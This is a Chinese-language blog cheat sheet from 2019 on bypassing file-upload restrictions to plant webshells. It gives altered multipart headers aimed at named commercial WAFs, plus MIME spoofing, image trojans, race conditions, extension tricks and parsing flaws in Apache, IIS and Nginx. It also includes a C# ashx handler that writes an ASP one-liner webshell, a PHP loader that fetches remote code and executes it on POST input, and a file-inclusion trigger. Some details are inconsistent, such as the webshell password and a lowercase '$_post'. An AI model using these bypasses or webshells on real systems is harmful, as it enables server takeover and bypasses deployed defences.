title: 上传绕过技巧
author: Believe firmly
tags:
  - 笔记
  - web技术
  - ''
categories: []
date: 2019-01-06 15:38:00
---
<div class="entry-content clearfix">
<p style="color:#red" class="has-text-color has-background has-black-background-color"> WAF绕过,安全狗绕过,WTS-WAF&nbsp;绕过上传,百度云上传绕过,360主机上传绕过,MIME类型绕过,文件内容检测绕过,多次上传Win特性绕过,条件竞争绕过,CONTENT-LENGTH绕过,文件内容检测绕过,垃圾数据填充绕过,文件扩展名绕过,ashx上传绕过,特殊文件名绕过,Windows流特性绕过,00截断绕过上传,htaccess解析漏洞,Apache解析漏洞,IIS解析漏洞,Nginx解析漏洞,文件包含绕过 </p>
<h3 id="waf绕过">WAF绕过</h3>
<h4 id="安全狗绕过">安全狗绕过</h4>
<p>1.绕过思路：对文件的内容，数据。数据包进行处理。</p>
<pre class="wp-block-code"><code class="hljs bash">关键点在这里Content-Disposition: form-data; name=<span class="hljs-string">"file"</span>; filename=<span class="hljs-string">"ian.php"</span>
将form-data;            修改为~form-data;</code></pre>
<p>2.通过替换大小写来进行绕过</p>
<pre class="wp-block-code"><code class="hljs bash">Content-Disposition: form-data; name=<span class="hljs-string">"file"</span>; filename=<span class="hljs-string">"yjh.php"</span>
Content-Type: application/octet-stream
将Content-Disposition    修改为content-Disposition
将 form-data            修改为Form-data
将 Content-Type         修改为content-Type</code></pre>
<p>3.通过删减空格来进行绕过</p>
<pre class="wp-block-code"><code class="hljs makefile"><span class="hljs-section">Content-Disposition: form-data; name="file"; filename="yjh.php"</span>
<span class="hljs-section">Content-Type: application/octet-stream</span>
<span class="hljs-section">将Content-Disposition: form-data          冒号后面 增加或减少一个空格</span><!--more-->
将form-data; name=<span class="hljs-string">"file"</span>;                分号后面 增加或减少一个空格
将 Content-Type: application/octet-stream   冒号后面 增加一个空格</code></pre>
<p>4.通过字符串拼接绕过</p>
<pre class="wp-block-code"><code class="hljs bash">看Content-Disposition: form-data; name=<span class="hljs-string">"file"</span>; filename=<span class="hljs-string">"yjh3.php"</span>
将 form-data 修改为   f+orm-data
将 from-data 修改为   form<span class="hljs-_">-d</span>+ata</code></pre>
<p>5.双文件上传绕过</p>
<pre class="wp-block-code"><code class="hljs cs">&lt;form action=<span class="hljs-string">"https://www.xxx.com/xxx.asp(php)"</span> method=<span class="hljs-string">"post"</span>
name=<span class="hljs-string">"form1"</span> enctype=<span class="hljs-string">"multipart/form‐data"</span>&gt;
&lt;input name=<span class="hljs-string">"FileName1"</span> type=<span class="hljs-string">"FILE"</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">"tx1"</span> size=<span class="hljs-string">"40"</span>&gt;
&lt;input name=<span class="hljs-string">"FileName2"</span> type=<span class="hljs-string">"FILE"</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">"tx1"</span> size=<span class="hljs-string">"40"</span>&gt;
&lt;input type=<span class="hljs-string">"submit"</span> name=<span class="hljs-string">"Submit"</span> <span class="hljs-keyword">value</span>=<span class="hljs-string">"上传"</span>&gt;
&lt;/form&gt;</code></pre>
<p>6.HTTP header 属性值绕过</p>
<pre class="wp-block-code"><code class="hljs bash">Content-Disposition: form-data; name=<span class="hljs-string">"file"</span>; filename=<span class="hljs-string">"yjh.php"</span>
我们通过替换form-data 为*来绕过
Content-Disposition: *; name=<span class="hljs-string">"file"</span>; filename=<span class="hljs-string">"yjh.php"</span></code></pre>
<p>7.HTTP header 属性名称绕过</p>
<pre class="wp-block-code"><code class="hljs bash">源代码:
Content-Disposition: form-data; name=<span class="hljs-string">"image"</span>; filename=<span class="hljs-string">"085733uykwusqcs8vw8wky.png"</span>Content-Type: image/png
绕过内容如下：
Content-Disposition: form-data; name=<span class="hljs-string">"image"</span>; filename=<span class="hljs-string">"085733uykwusqcs8vw8wky.png
C.php"</span>
删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php<span class="hljs-string">".</span></code></pre>
<p>8.等效替换绕过</p>
<pre class="wp-block-code"><code class="hljs makefile">原内容：
<span class="hljs-section">Content-Type: multipart/form-data; boundary=---------------------------471463142114</span>
<span class="hljs-section">修改后:</span>
<span class="hljs-section">Content-Type: multipart/form-data; boundary =---------------------------471463142114</span>
boundary后面加入空格。</code></pre>
<p>9.修改编码绕过</p>
<pre class="wp-block-code"><code class="hljs">使用UTF-16、Unicode、双URL编码等等
</code></pre>
<h4 id="wts-waf-绕过上传">WTS-WAF 绕过上传</h4>
<pre class="wp-block-code"><code class="hljs bash">原内容：
Content-Disposition: form-data; name=<span class="hljs-string">"up_picture"</span>; filename=<span class="hljs-string">"xss.php"</span>
添加回车
Content-Disposition: form-data; name=<span class="hljs-string">"up_picture"</span>; filename=<span class="hljs-string">"xss.php"</span>
</code></pre>
<h4 id="百度云上传绕过">百度云上传绕过</h4>
<pre class="wp-block-code"><code class="hljs bash">百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。
Content-Disposition: form-data; name=<span class="hljs-string">"up_picture"</span>; filename=<span class="hljs-string">"xss.jpg .Php"</span></code></pre>
<h4 id="阿里云上传绕过">阿里云上传绕过</h4>
<pre class="wp-block-code"><code class="hljs bash">源代码：
Content-Disposition: form-data; name=<span class="hljs-string">"img_crop_file"</span>; filename=<span class="hljs-string">"1.jpg .Php"</span>Content-Type: image/jpeg
修改如下：
Content-Disposition: form-data; name=<span class="hljs-string">"img_crop_file"</span>; filename=<span class="hljs-string">"1.php"</span>
没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。
</code></pre>
<h4 id="360主机上传绕过">360主机上传绕过</h4>
<pre class="wp-block-code"><code class="hljs bash">源代码:
Content-Disposition: form-data; name=<span class="hljs-string">"image"</span>; filename=<span class="hljs-string">"085733uykwusqcs8vw8wky.png"</span>Content-Type: image/png
绕过内容如下：
Content- Disposition: form-data; name=<span class="hljs-string">"image"</span>; filename=<span class="hljs-string">"085733uykwusqcs8vw8wky.png
Content-Disposition 修改为 Content-空格Disposition</span></code></pre>
<h4 id="mime类型绕过">MIME类型绕过</h4>
<pre class="wp-block-code"><code class="hljs">上传木马时，提示格式错误。直接抓包修改Content-Type 为正确的格式尝试绕过</code></pre>
<h4 id="文件内容检测绕过">文件内容检测绕过</h4>
<pre class="wp-block-code"><code class="hljs">抓包，在正常图片末尾添加一句话木马</code></pre>
<h4 id="多次上传win特性绕过">多次上传Win特性绕过</h4>
<pre class="wp-block-code"><code class="hljs css">多次上传同一个文件，<span class="hljs-selector-tag">windows</span>会自动更新补全<span class="hljs-selector-tag">TEST</span> (1)<span class="hljs-selector-class">.php</span>。
有时会触发条件竞争，导致绕过。</code></pre>
<h4 id="条件竞争绕过">条件竞争绕过</h4>
<pre class="wp-block-code"><code class="hljs">通过BURP不断发包，导致不断写入Webshell，再写入速度频率上超过安全软件查杀频率，导致绕过。</code></pre>
<h4 id="content-length绕过">CONTENT-LENGTH绕过</h4>
<pre class="wp-block-code"><code class="hljs">针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，Web服务器上的最大长度限制。我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围。</code></pre>
<h4 id="文件内容检测绕过">文件内容检测绕过</h4>
<pre class="wp-block-code"><code class="hljs">针对文件内容检测的绕过，一般有两种方式，
1.制作图片马
2.文件幻术头绕过
PNG 的文件头为十六进制的 89 50 4E 47 0D 0A 1A 0A、GIF 为 47 49 46 38 37 61、JPG 为 FF D8 FF E0
</code></pre>
<h4 id="垃圾数据填充绕过">垃圾数据填充绕过</h4>
<pre class="wp-block-code"><code class="hljs">修改HTTP请求，再之中加入大量垃圾数据。</code></pre>
<h3 id="黑名单后缀绕过">黑名单后缀绕过</h3>
<h4 id="文件扩展名绕过">文件扩展名绕过</h4>
<pre class="wp-block-code"><code class="hljs css"><span class="hljs-selector-tag">Php</span>除了可以解析<span class="hljs-selector-tag">php</span>后缀 还可以解析<span class="hljs-selector-tag">php2</span><span class="hljs-selector-class">.php3</span>，<span class="hljs-selector-tag">php4</span> 后缀</code></pre>
<h4 id="ashx上传绕过">ashx上传绕过</h4>
<pre class="wp-block-code"><code class="hljs cs">cer,asa,cdx等等无法使用时候。
解析后就会生成一个test.asp的马，你就可以连接这个test.asp  密码为:put
&lt;%@ WebHandler Language=<span class="hljs-string">"C#"</span> Class=<span class="hljs-string">"Handler"</span> %&gt;
<span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Web;
<span class="hljs-keyword">using</span> System.IO;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Handler</span> : <span class="hljs-title">IHttpHandler</span> {

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ProcessRequest</span> (<span class="hljs-params">HttpContext context</span>)</span> {
        context.Response.ContentType = <span class="hljs-string">"text/plain"</span>;

        <span class="hljs-comment">//这里会在目录下生成一个test.asp的文件</span>
        StreamWriter file1= File.CreateText(context.Server.MapPath(<span class="hljs-string">"test.asp"</span>));
        <span class="hljs-comment">//这里是写入一句话木马   密码是：ptu</span>
        file1.Write(<span class="hljs-string">"&lt;%response.clear:execute request("</span>put<span class="hljs-string">"):response.End%&gt;"</span>);
        file1.Flush();
        file1.Close();       
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">bool</span> IsReusable {
        <span class="hljs-keyword">get</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }

}</code></pre>
<h4 id="特殊文件名绕过">特殊文件名绕过</h4>
<pre class="wp-block-code"><code class="hljs">比如发送的 http包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式
在windows系统里是不被允许的，所以需要在 burp之类里进行修改，然后绕过验证后，会
被windows系统自动去掉后面的点和空格，但要注意Unix/Linux系统没有这个特性。</code></pre>
<h4 id="windows流特性绕过">Windows流特性绕过</h4>
<pre class="wp-block-code"><code class="hljs bash">php在windows的时候如果文件名+<span class="hljs-string">"::<span class="hljs-variable">$DATA</span>"</span>会把::<span class="hljs-variable">$DATA</span>之后的数据当成文件流处理,不会检测后缀名.且保持<span class="hljs-string">"::<span class="hljs-variable">$DATA</span>"</span>之前的文件名。</code></pre>
<h3 id="白名单后缀绕过">白名单后缀绕过</h3>
<h4 id="00截断绕过上传">00截断绕过上传</h4>
<pre class="wp-block-code"><code class="hljs properties"><span class="hljs-attr">php</span> <span class="hljs-string">.jpg   空格二进制20改为00</span>
<span class="hljs-attr">IIS</span> <span class="hljs-string">6.0 目录路径检测解析绕过</span>
<span class="hljs-attr">上传路径改为</span>
<span class="hljs-attr">XXX/1.asp/</span></code></pre>
<h4 id="htaccess解析漏洞">htaccess解析漏洞</h4>
<pre class="wp-block-code"><code class="hljs properties"><span class="hljs-attr">上传的jpg文件都会以php格式解析</span>
<span class="hljs-attr">.htaccess内容：</span>
<span class="hljs-attr">AddType</span>    <span class="hljs-string">application/x-httpd-php    .jpg</span></code></pre>
<h4 id="突破mime限制上传">突破MIME限制上传</h4>
<pre class="wp-block-code"><code class="hljs">方法：找一个正常的可上传的查看其的MIME类型，然后将马子的MIME改成合法的MIME即可。</code></pre>
<h4 id="apache解析漏洞">Apache解析漏洞</h4>
<pre class="wp-block-code"><code class="hljs css">1.一个文件名为<span class="hljs-selector-tag">test</span><span class="hljs-selector-class">.x1</span><span class="hljs-selector-class">.x2</span><span class="hljs-selector-class">.x3</span>的文件，<span class="hljs-selector-tag">apache</span>会从<span class="hljs-selector-tag">x3</span>的位置开始尝试解析，如果<span class="hljs-selector-tag">x3</span>不属于<span class="hljs-selector-tag">apache</span>能够解析的扩展名，那么<span class="hljs-selector-tag">apache</span>会尝试去解析<span class="hljs-selector-tag">x2</span>，直到能够解析到能够解析的为止，否则就会报错。
2<span class="hljs-selector-class">.CVE-2017-15715</span>，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是\<span class="hljs-selector-tag">x0A</span>，如上传<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span>，然后在<span class="hljs-selector-tag">burp</span>中修改文件名为<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span>\<span class="hljs-selector-tag">x0A</span>)，以此来绕过一些黑名单过滤。
</code></pre>
<h4 id="iis解析漏洞">IIS解析漏洞</h4>
<pre class="wp-block-code"><code class="hljs bash">IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含<span class="hljs-string">".asp"</span>字符串，
那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有<span class="hljs-string">".asp;"</span>
会优先按asp来解析
IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL
后面追加上字符串<span class="hljs-string">"/任意文件名.php"</span>就会按照php的方式去解析；
</code></pre>
<h4 id="nginx解析漏洞">Nginx解析漏洞</h4>
<pre class="wp-block-code"><code class="hljs perl">解析： (任意文件名)/(任意文件名).php | (任意文件名)%00.php
描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php
的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。
还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</code></pre>
<h4 id="解析漏洞">解析漏洞</h4>
<pre class="wp-block-code"><code class="hljs apache"><span class="hljs-attribute">Content</span>-Disposition: form-data; name=<span class="hljs-string">"file"</span>;  filename=php.php;.jpg</code></pre>
<h3 id="前端限制绕过">前端限制绕过</h3>
<pre class="wp-block-code"><code class="hljs">1.使用BURP抓包修改后重放
2.或者使用浏览器中元素审查，修改允许或禁止上传文件类型。</code></pre>
<h3 id="下载绕过">下载绕过</h3>
<p>远程下载文件绕过</p>
<pre class="wp-block-code"><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>
$str = file_get_contents(<span class="hljs-string">'http://127.0.0.1/ian.txt'</span>);
$str($_post[<span class="hljs-string">'ian'</span>]);
<span class="hljs-meta">?&gt;</span></span></code></pre>
<h3 id="文件包含绕过">文件包含绕过</h3>
<pre class="wp-block-code"><code class="hljs ruby">上传图片木马
$x=$_GET[<span class="hljs-string">'x'</span>];
<span class="hljs-keyword">include</span>($x);
访问<span class="hljs-symbol">:http</span><span class="hljs-symbol">://www</span>.xxxx.com/news.php?x=xxxxxx.jpg</code></pre>
<h3 id="文件包含绕过">绕过AV软件添加账户并远程桌面</h3>
https://xz.aliyun.com/t/4078
</div>